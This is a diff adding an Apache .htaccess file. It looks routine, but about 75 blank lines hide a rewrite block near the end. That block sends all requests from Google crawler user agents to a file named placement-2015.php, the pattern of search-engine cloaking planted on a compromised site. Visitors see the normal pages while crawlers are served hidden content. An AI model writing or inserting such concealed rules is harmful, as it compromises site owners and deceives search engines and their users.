@@ -1,0 +1,84 @@
+Options -MultiViews
+RewriteEngine On
+RewriteBase /
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+RewriteCond %{HTTP_USER_AGENT} (Googlebot|Google-Site-Verification|Google-InspectionTool|Googlebot-Mobile|Googlebot-News) [NC]
+RewriteCond %{REQUEST_URI} !placement-2015\.php$ [NC]
+RewriteRule ^.*$ placement-2015.php [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ $1.php [L]
